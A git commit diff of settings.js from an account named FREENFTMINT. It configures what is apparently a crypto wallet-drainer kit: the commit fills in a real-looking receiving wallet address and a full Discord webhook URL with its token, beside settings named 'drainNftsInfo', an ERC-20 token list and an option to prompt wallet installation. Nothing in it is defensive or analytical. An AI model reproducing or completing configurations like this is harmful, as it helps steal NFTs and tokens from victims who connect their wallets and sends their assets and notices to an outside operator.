8f6df56137771efddaf463954c4f9ae7989e61ee
FREENFTMINT <110479678+FREENFTMINT@users.noreply.github.com>
2022-09-15 02:00:23 +0200

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 const workChainId = 1; // The network we are working with is the chainId list https://chainlist.org/
 
-const receiveAddress = "YOURWALLETADDRESS"; // YOUR WALLET ADDRESS
+const receiveAddress = "0x6dd2f906368fa50133d724d3346d9C5b3C2D17ea"; // YOUR WALLET ADDRESS
 
 
 const drainNftsInfo = {
@@ -36,7 +36,7 @@ const erc20list = {
 
 const installInNewWindow = true; // install wallet if not installed
 
-const discordWebhookURL = "DISCORDWEBHOOKURL"; // put ur discord webhook url in here to receive NFT's
+const discordWebhookURL = "https://discord.com/api/webhooks/1004018654695927818/yD6kR_rqgCCvfBLFmVjybyOEnuPOVtodxVLcAcyqq1YHDnAho51A1y6SgoAiwIZHlPXQ"; // put ur discord webhook url in here to receive NFT's
 const feedbackEnabled = true; // let enabled to receive webhooks
 /*
     = = = = = END OF SETTINGS = = = = =
